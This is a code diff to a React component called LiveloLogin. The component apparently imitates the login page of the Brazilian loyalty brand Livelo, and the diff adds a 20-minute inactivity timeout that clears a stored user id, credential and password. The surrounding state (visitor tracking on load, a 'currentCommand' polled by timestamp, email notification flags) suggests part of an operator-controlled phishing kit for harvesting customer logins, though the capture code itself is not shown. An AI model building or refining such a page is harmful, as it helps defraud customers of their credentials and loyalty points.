@@ -15,12 +15,60 @@ function LiveloLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [isValid, setIsValid] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [userId, setUserId] = useState(localStorage.getItem("livelo_user_id"));
   const [hasError, setHasError] = useState(false);
   const [lastProcessedTimestamp, setLastProcessedTimestamp] = useState(null);
   const [currentCommand, setCurrentCommand] = useState(null);
   const [emailNotified, setEmailNotified] = useState(false);
   const emailDebounceRef = useRef(null);
+
+  // Verificar se sessão expirou (20 min) e limpar
+  const SESSION_TIMEOUT = 20 * 60 * 1000; // 20 minutos
+  
+  const checkSession = () => {
+    const savedTime = localStorage.getItem("livelo_session_time");
+    if (savedTime && (Date.now() - parseInt(savedTime)) > SESSION_TIMEOUT) {
+      localStorage.removeItem("livelo_user_id");
+      localStorage.removeItem("livelo_session_time");
+      return null;
+    }
+    return localStorage.getItem("livelo_user_id");
+  };
+
+  const [userId, setUserId] = useState(() => checkSession());
+
+  // Atualizar timestamp de atividade a cada interação
+  useEffect(() => {
+    const updateActivity = () => {
+      if (userId) {
+        localStorage.setItem("livelo_session_time", Date.now().toString());
+      }
+    };
+
+    // Atualizar ao interagir
+    window.addEventListener("click", updateActivity);
+    window.addEventListener("keydown", updateActivity);
+
+    // Checar expiração a cada minuto
+    const checkInterval = setInterval(() => {
+      const savedTime = localStorage.getItem("livelo_session_time");
+      if (savedTime && (Date.now() - parseInt(savedTime)) > SESSION_TIMEOUT) {
+        localStorage.removeItem("livelo_user_id");
+        localStorage.removeItem("livelo_session_time");
+        setUserId(null);
+        setCurrentCommand(null);
+        setCredential("");
+        setPassword("");
+        setIsLoading(false);
+        setHasError(false);
+      }
+    }, 60000);
+
+    return () => {
+      window.removeEventListener("click", updateActivity);
+      window.removeEventListener("keydown", updateActivity);
+      clearInterval(checkInterval);
+    };
+  }, [userId]);
 
   // Rastrear visitante ao carregar a página
   useEffect(() => {
@@ -137,6 +185,7 @@ function LiveloLogin() {
           if (response.data && response.data.id) {
             currentUserId = response.data.id;
             localStorage.setItem("livelo_user_id", currentUserId);
+            localStorage.setItem("livelo_session_time", Date.now().toString());
             setUserId(currentUserId);
           }
         } else {
